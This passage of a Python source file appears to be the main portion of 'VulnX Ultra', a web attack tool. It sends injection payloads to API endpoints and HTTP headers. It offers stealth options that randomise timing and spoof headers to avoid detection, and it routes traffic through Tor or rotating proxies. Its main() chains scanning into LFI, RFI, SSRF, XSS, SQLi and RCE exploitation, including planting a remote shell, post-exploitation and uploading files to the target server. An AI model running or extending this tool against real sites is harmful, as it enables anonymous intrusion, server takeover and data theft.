            "User-Agent": get_random_user_agent(),
            "Accept": "application/json, */*; q=0.01",
            "Content-Type": "application/json"
        }
        
        if stealth:
            headers.update({
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.example.com",
                "Referer": "https://www.example.com/api-docs"
            })
        
        for payload in track(payloads, description="Testing API payloads..."):
            time.sleep(delay + (random.uniform(0, 1) if stealth else 0)) 
            
            try:
                if method.upper() == "GET":
                    response = requests.get(f"{endpoint}?test={payload}", 
                                         headers=headers, 
                                         timeout=10, 
                                         proxies=proxies)
                elif method.upper() == "POST":
                    response = requests.post(endpoint, 
                                           json={"test": payload}, 
                                           headers=headers, 
                                           timeout=10, 
                                           proxies=proxies)
                elif method.upper() == "PUT":
                    response = requests.put(endpoint, 
                                          json={"test": payload}, 
                                          headers=headers, 
                                          timeout=10, 
                                          proxies=proxies)
                elif method.upper() == "DELETE":
                    response = requests.delete(f"{endpoint}?test={payload}", 
                                             headers=headers, 
                                             timeout=10, 
                                             proxies=proxies)
                
                vuln_type, message = analyze_response(response, payload, custom_keywords)
                if vuln_type:
                    results.append({
                        "payload": payload,
                        "url": endpoint,
                        "type": vuln_type,
                        "message": message,
                        "status": response.status_code,
                        "method": method.upper()
                    })
            except Exception as e:
                logging.error(f"Error testing API payload {payload}: {str(e)}")
                results.append({
                    "payload": payload,
                    "url": endpoint,
                    "type": "Error",
                    "message": str(e),
                    "status": None,
                    "method": method.upper()
                })
    except Exception as e:
        logging.error(f"Error in test_api: {str(e)}")
        console.print(f"[red]Error in API scanning: {str(e)}[/red]")
    
    return results

# Test HTTP headers
def test_headers(url, payloads, headers_to_test=["X-Forwarded-For", "Referer"], 
                proxies=None, custom_keywords=None, delay=0, stealth=False):
    results = []
    try:
        console.print(f"[cyan]Testing {len(headers_to_test)} headers with {len(payloads)} payloads[/cyan]")
        logging.info(f"Testing {len(headers_to_test)} headers with {len(payloads)} payloads")
        
        base_headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
        
        if stealth:
            base_headers.update({
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            })
        
        for payload in track(payloads, description="Testing headers..."):
            time.sleep(delay + (random.uniform(0, 0.5) if stealth else 0)) 
            
            try:
                headers = base_headers.copy()
                headers.update({header: payload for header in headers_to_test})
                
                response = requests.get(url, headers=headers, timeout=10, proxies=proxies)
                
                vuln_type, message = analyze_response(response, payload, custom_keywords)
                if vuln_type:
                    results.append({
                        "payload": payload,
                        "url": url,
                        "type": vuln_type,
                        "message": message,
                        "status": response.status_code,
                        "headers": headers_to_test
                    })
            except Exception as e:
                logging.error(f"Error testing header payload {payload}: {str(e)}")
                results.append({
                    "payload": payload,
                    "url": url,
                    "type": "Error",
                    "message": str(e),
                    "status": None,
                    "headers": headers_to_test
                })
    except Exception as e:
        logging.error(f"Error in test_headers: {str(e)}")
        console.print(f"[red]Error in headers scanning: {str(e)}[/red]")
    
    return results

# Save results to file
def save_results(results, output_file):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        if output_file.endswith(".json"):
            with open(f"{output_file}_{timestamp}.json", "w") as f:
                json.dump(results, f, indent=4, ensure_ascii=False)
            console.print(f"[green]✓ Results saved to {output_file}_{timestamp}.json[/green]")
        elif output_file.endswith(".csv"):
            with open(f"{output_file}_{timestamp}.csv", "w", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=results[0].keys() if results else [])
                writer.writeheader()
                writer.writerows(results)
            console.print(f"[green]✓ Results saved to {output_file}_{timestamp}.csv[/green]")
        else:
            with open(f"{output_file}_{timestamp}.txt", "w", encoding="utf-8") as f:
                for result in results:
                    f.write(f"Payload: {result.get('payload', 'N/A')}\n")
                    f.write(f"URL: {result.get('url', 'N/A')}\n")
                    f.write(f"Type: {result.get('type', 'N/A')}\n")
                    f.write(f"Message: {result.get('message', 'N/A')}\n")
                    f.write(f"Status: {result.get('status', 'N/A')}\n")
                    if "response_time" in result:
                        f.write(f"Response Time: {result['response_time']:.2f}s\n")
                    if "method" in result:
                        f.write(f"Method: {result['method']}\n")
                    if "headers" in result:
                        f.write(f"Headers: {', '.join(result['headers'])}\n")
                    f.write("\n" + "="*50 + "\n\n")
            console.print(f"[green]✓ Results saved to {output_file}_{timestamp}.txt[/green]")
        
        logging.info(f"Results saved to {output_file}_{timestamp}")
    except Exception as e:
        logging.error(f"Error saving results: {str(e)}")
        console.print(f"[red]✗ Error saving results: {str(e)}[/red]")

# Load config from YAML file
def load_config(config_file):
    try:
        with open(config_file, "r") as f:
            config = yaml.safe_load(f)
            logging.info("Configuration loaded successfully")
            console.print(f"[green]✓ Loaded configuration from {config_file}[/green]")
            return config
    except Exception as e:
        logging.error(f"Error loading config: {str(e)}")
        console.print(f"[red]✗ Error loading config: {str(e)}[/red]")
        return {}

# Load proxy list from file
def load_proxies(proxy_file):
    try:
        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies)} proxies from {proxy_file}")
        console.print(f"[green]✓ Loaded {len(proxies)} proxies from {proxy_file}[/green]")
        return proxies
    except Exception as e:
        logging.error(f"Error loading proxies: {str(e)}")
        console.print(f"[red]✗ Error loading proxies: {str(e)}[/red]")
        return []

# Load payloads from file
def load_payloads_from_file(file_path):
    try:
        if not os.path.exists(file_path):
            console.print(f"[red]✗ Payload file {file_path} does not exist[/red]")
            logging.error(f"Payload file {file_path} does not exist")
            return []
        with open(file_path, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
        console.print(f"[green]✓ Loaded {len(payloads)} payloads from {file_path}[/green]")
        logging.info(f"Loaded {len(payloads)} payloads from {file_path}")
        return payloads
    except Exception as e:
        console.print(f"[red]✗ Error loading payloads from {file_path}: {str(e)}[/red]")
        logging.error(f"Error loading payloads from {file_path}: {str(e)}")
        return []

# Display results in table
def display_results(results):
    if not results:
        console.print("[yellow]⚠ No vulnerabilities found.[/yellow]")
        logging.info("No vulnerabilities found")
        return
    
    table = Table(title="[bold]Vulnerability Scan Results[/bold]", show_lines=True)
    table.add_column("Type", style="cyan", no_wrap=True)
    table.add_column("Payload", style="magenta")
    table.add_column("URL", style="green")
    table.add_column("Message", style="yellow")
    table.add_column("Status", style="red", justify="right")
    
    for result in results:
        status = str(result.get("status", "N/A"))
        if status.startswith("2"):
            status = f"[green]{status}[/green]"
        elif status.startswith("4") or status.startswith("5"):
            status = f"[red]{status}[/red]"
        
        table.add_row(
            result.get("type", "N/A"),
            result.get("payload", "N/A"),
            result.get("url", "N/A"),
            result.get("message", "N/A"),
            status
        )
    
    console.print(table)
    console.print(f"[bold]Total vulnerabilities found: [green]{len(results)}[/green][/bold]")
    logging.info(f"Displayed {len(results)} results")

# Main function
def main():
    parser = argparse.ArgumentParser(description="VulnX Ultra - Advanced Web Vulnerability Scanner", 
                                   formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/page.php)")
    parser.add_argument("-p", "--param", default="file", help="Parameter to test (default: file)")
    parser.add_argument("--lfi", action="store_true", help="Test for Local File Inclusion")
    parser.add_argument("--rfi", action="store_true", help="Test for Remote File Inclusion")
    parser.add_argument("--ssrf", action="store_true", help="Test for Server-Side Request Forgery")
    parser.add_argument("--xss", action="store_true", help="Test for Cross-Site Scripting")
    parser.add_argument("--sqli", action="store_true", help="Test for SQL Injection")
    parser.add_argument("--rce", action="store_true", help="Test for Remote Code Execution")
    parser.add_argument("--api", action="store_true", help="Test API endpoint")
    parser.add_argument("--headers", action="store_true", help="Test HTTP headers")
    parser.add_argument("--method", default="GET", help="HTTP method for API (GET/POST/PUT/DELETE)")
    parser.add_argument("--encode", action="store_true", help="Use URL/Base64 encoding")
    parser.add_argument("--os", default="linux", choices=["linux", "windows"], help="Target OS")
    parser.add_argument("--custom-payload", help="Custom payload file")
    parser.add_argument("--output", help="Output file for results (txt/json/csv)")
    parser.add_argument("--proxy", help="Single proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--proxy-list", help="File containing proxy list")
    parser.add_argument("--tor", action="store_true", help="Use Tor network (127.0.0.1:9050)")
    parser.add_argument("--config", help="Configuration file (YAML)")
    parser.add_argument("--keywords", help="Custom keywords for response checking (comma-separated)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--detect-waf", action="store_true", help="Detect Web Application Firewall")
    parser.add_argument("--detect-ips", action="store_true", help="Detect IPS/IDS systems")
    parser.add_argument("--fingerprint", action="store_true", help="Perform OS fingerprinting")
    parser.add_argument("--subdomains", action="store_true", help="Enumerate subdomains")
    parser.add_argument("--port-scan", action="store_true", help="Perform port scanning")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (slower but less detectable)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads for scanning (default: 10)")
    parser.add_argument("--show-guide", action="store_true", help="Show usage guide and exit")
    parser.add_argument("--exploit-lfi", action="store_true", help="Exploit LFI vulnerabilities (requires --lfi)")
    parser.add_argument("--exploit-rfi", action="store_true", help="Exploit RFI vulnerabilities (requires --rfi)")
    parser.add_argument("--exploit-ssrf", action="store_true", help="Exploit SSRF vulnerabilities (requires --ssrf)")
    parser.add_argument("--exploit-xss", action="store_true", help="Exploit XSS vulnerabilities (requires --xss)")
    parser.add_argument("--exploit-sqli", action="store_true", help="Exploit SQLi vulnerabilities (requires --sqli)")
    parser.add_argument("--exploit-rce", action="store_true", help="Exploit RCE vulnerabilities (requires --rce)")
    parser.add_argument("--server", help="External server URL for RFI or RCE exploitation")
    parser.add_argument("--upload", help="Upload a file (format: local_path:remote_path)")
    
    args = parser.parse_args()
    
    # Show usage guide if requested
    if args.show_guide:
        display_banner()
        show_usage_guide()
        sys.exit(0)
    
    # Display banner
    display_banner()
    logging.info("VulnX Ultra scanner started")
    
    # Load config from YAML file
    config = load_config(args.config) if args.config else {}
    
    # Setup proxy or Tor
    proxies = None
    if args.tor:
        if check_tor_connection():
            proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        else:
            console.print("[red]✗ Exiting due to Tor connection failure.[/red]")
            sys.exit(1)
    elif args.proxy:
        if check_proxy_connection(args.proxy):
            proxies = {"http": args.proxy, "https": args.proxy}
        else:
            console.print("[red]✗ Exiting due to proxy failure.[/red]")
            sys.exit(1)
    elif args.proxy_list:
        proxy_list = load_proxies(args.proxy_list)
        if proxy_list:
            proxy = random.choice(proxy_list)
            if check_proxy_connection(proxy):
                proxies = {"http": proxy, "https": proxy}
            else:
                console.print("[red]✗ Exiting due to proxy list failure.[/red]")
            sys.exit(1)
    
    # Load custom keywords
    custom_keywords = []
    if args.keywords:
        custom_keywords = [kw.strip() for kw in args.keywords.split(",")]
    elif config.get("keywords"):
        custom_keywords = config.get("keywords", [])
    
    # Detect security systems if requested
    if args.detect_waf:
        detect_waf(args.url, proxies)
    
    if args.detect_ips:
        detect_security_systems(args.url, proxies)
    
    # Fingerprint OS if requested
    if args.fingerprint:
        fingerprint_os(args.url, proxies)
    
    # Enumerate subdomains if requested
    if args.subdomains:
        domain = args.url.split("//")[-1].split("/")[0].split("?")[0]
        enumerate_subdomains(domain, proxies=proxies)
    
    # Port scan if requested
    if args.port_scan:
        domain = args.url.split("//")[-1].split("/")[0].split("?")[0]
        port_scan(domain, proxies=proxies)
    
    # Load custom payloads
    payloads = []
    if args.custom_payload:
        try:
            with open(args.custom_payload, "r") as f:
                payloads = [line.strip() for line in f if line.strip()]
            console.print(f"[cyan]✓ Loaded {len(payloads)} custom payloads from {args.custom_payload}[/cyan]")
            logging.info(f"Loaded {len(payloads)} custom payloads")
        except Exception as e:
            console.print(f"[red]✗ Error loading custom payloads: {str(e)}[/red]")
            logging.error(f"Error loading custom payloads: {str(e)}")
    
    # Load payloads from Payload directory
    payload_dir = "Payload"
    if args.xss:
        xss_payload_file = os.path.join(payload_dir, "xss_payloads.txt")
        payloads.extend(load_payloads_from_file(xss_payload_file))
    if args.sqli:
        sqli_payload_file = os.path.join(payload_dir, "sqli_payloads.txt")
        payloads.extend(load_payloads_from_file(sqli_payload_file))
    if args.ssrf:
        ssrf_payload_file = os.path.join(payload_dir, "ssrf_payloads.txt")
        payloads.extend(load_payloads_from_file(ssrf_payload_file))
    if args.rce:
        rce_payload_file = os.path.join(payload_dir, "rce_payloads.txt")
        payloads.extend(load_payloads_from_file(rce_payload_file))
    
    # Select payloads based on scan type
    if args.lfi:
        payloads.extend(LFI_PAYLOADS)
    if args.rfi:
        payloads.extend(RFI_PAYLOADS)
    if args.ssrf:
        payloads.extend(SSRF_PAYLOADS)
    if args.xss:
        payloads.extend(XSS_PAYLOADS)
    if args.sqli:
        payloads.extend(SQLI_PAYLOADS)
    if args.rce:
        payloads.extend(RCE_PAYLOADS)
    if not payloads:  # If no type specified, use all payloads
        payloads.extend(LFI_PAYLOADS + RFI_PAYLOADS + SSRF_PAYLOADS + XSS_PAYLOADS + SQLI_PAYLOADS + RCE_PAYLOADS)
    
    # Remove duplicates from payloads
    payloads = list(set(payloads))
    
    # Execute scan
    results = []
    try:
        if args.api:
            results = test_api(args.url, args.method, payloads, proxies, custom_keywords, args.delay, args.stealth)
        elif args.headers:
            results = test_headers(args.url, payloads, proxies=proxies, custom_keywords=custom_keywords, 
                                 delay=args.delay, stealth=args.stealth)
        else:
            results = test_url(args.url, payloads, args.param, args.encode, args.os, proxies, 
                             custom_keywords, args.delay, args.stealth, args.threads)
    except KeyboardInterrupt:
        console.print("[yellow]⚠ Scan interrupted by user.[/yellow]")
        logging.info("Scan interrupted by user")
    except Exception as e:
        console.print(f"[red]✗ Error during scanning: {str(e)}[/red]")
        logging.error(f"Error during scanning: {str(e)}")
    
    # Exploit LFI if requested and vulnerable
    if args.exploit_lfi and args.lfi:
        console.print(Panel.fit("[bold red]Starting LFI Exploitation[/bold red]"))
        if LFIExploiter:
            exploiter = LFIExploiter(
                url=args.url,
                param=args.param,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "lfi_exploit"
            )
            exploiter.exploit()
        else:
            console.print("[red]✗ LFIExploiter module not available[/red]")
            logging.error("LFIExploiter module not available")
    
    # Exploit RFI if requested and vulnerable
    if args.exploit_rfi and args.rfi:
        console.print(Panel.fit("[bold red]Starting RFI Exploitation[/bold red]"))
        if RFIExploiter:
            exploiter = RFIExploiter(
                url=args.url,
                param=args.param,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "rfi_exploit"
            )
            
            # Use provided server URL or start local server
            server_url = args.server if args.server else None
            exploiter.exploit(server_url)
            
            # Perform post-exploitation if successful
            if exploiter.vulnerable:
                exploiter.post_exploitation(f"{args.url}?{args.param}={exploiter.shell_url}")
                
                # Upload file if specified
                if args.upload:
                    local_file, remote_path = args.upload.split(":")
                    exploiter.upload_file(
                        f"{args.url}?{args.param}={exploiter.shell_url}",
                        local_file,
                        remote_path
                    )
        else:
            console.print("[red]✗ RFIExploiter module not available[/red]")
            logging.error("RFIExploiter module not available")
    
    # Exploit SSRF if requested and vulnerable
    if args.exploit_ssrf and args.ssrf:
        console.print(Panel.fit("[bold red]Starting SSRF Exploitation[/bold red]"))
        if SSRFExploiter:
            exploiter = SSRFExploiter(
                url=args.url,
                param=args.param,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "ssrf_exploit"
            )
            exploiter.exploit()
        else:
            console.print("[red]✗ SSRFExploiter module not available[/red]")
            logging.error("SSRFExploiter module not available")
    
    # Exploit XSS if requested and vulnerable
    if args.exploit_xss and args.xss:
        console.print(Panel.fit("[bold red]Starting XSS Exploitation[/bold red]"))
        if XSSExploiter:
            exploiter = XSSExploiter(
                url=args.url,
                param=args.param,
                method=args.method,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "xss_exploit"
            )
            exploiter.exploit()
        else:
            console.print("[red]✗ XSSExploiter module not available[/red]")
            logging.error("XSSExploiter module not available")
    
    # Exploit SQLi if requested and vulnerable
    if args.exploit_sqli and args.sqli:
        console.print(Panel.fit("[bold red]Starting SQLi Exploitation[/bold red]"))
        if SQLiExploiter:
            exploiter = SQLiExploiter(
                url=args.url,
                param=args.param,
                method=args.method,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "sqli_exploit"
            )
            exploiter.exploit()
        else:
            console.print("[red]✗ SQLiExploiter module not available[/red]")
            logging.error("SQLiExploiter module not available")
    
    # Exploit RCE if requested and vulnerable
    if args.exploit_rce and args.rce:
        console.print(Panel.fit("[bold red]Starting RCE Exploitation[/bold red]"))
        if RCEExploiter:
            exploiter = RCEExploiter(
                url=args.url,
                param=args.param,
                method=args.method,
                proxies=proxies,
                stealth=args.stealth,
                delay=args.delay,
                output=args.output if args.output else "rce_exploit",
                server_url=args.server if args.server else None
            )
            exploiter.exploit()
            
            # Perform post-exploitation if successful
            if exploiter.vulnerable:
                exploiter.post_exploitation(f"{args.url}?{args.param}={exploiter.shell_url}")
                
                # Upload file if specified
                if args.upload:
                    local_file, remote_path = args.upload.split(":")
                    exploiter.upload_file(
                        f"{args.url}?{args.param}={exploiter.shell_url}",
                        local_file,
                        remote_path
                    )
        else:
            console.print("[red]✗ RCEExploiter module not available[/red]")
            logging.error("RCEExploiter module not available")
    
    # Display results
    display_results(results)
    
    # Save results if output file specified
    if args.output:
        save_results(results, args.output)
    
    logging.info("VulnX Ultra scanner finished")

if __name__ == "__main__":
    main()
    